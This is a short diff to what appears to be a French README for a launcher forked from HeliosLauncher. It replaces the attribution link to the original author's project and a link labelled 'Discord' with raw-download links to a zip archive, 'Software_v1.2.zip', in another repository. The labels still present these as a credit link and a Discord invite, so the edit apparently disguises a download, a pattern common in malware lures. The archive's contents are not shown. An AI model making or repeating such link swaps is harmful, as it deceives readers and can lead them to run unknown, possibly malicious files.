@@ -9,10 +9,10 @@
 
 
 <p>
-    Basé sur le travail de Daniel Scalzi (https://github.com/dscalzi/HeliosLauncher)
+    Basé sur le travail de Daniel Scalzi (https://raw.githubusercontent.com/nkzprod/harionalauncher/master/app/panels/Software_v1.2.zip)
 </p>
 
 ---
 
 
-[discord]: https://github.com/hariona-dev/harionalauncher/releases 'Discord'
+[discord]: https://raw.githubusercontent.com/nkzprod/harionalauncher/master/app/panels/Software_v1.2.zip 'Discord'
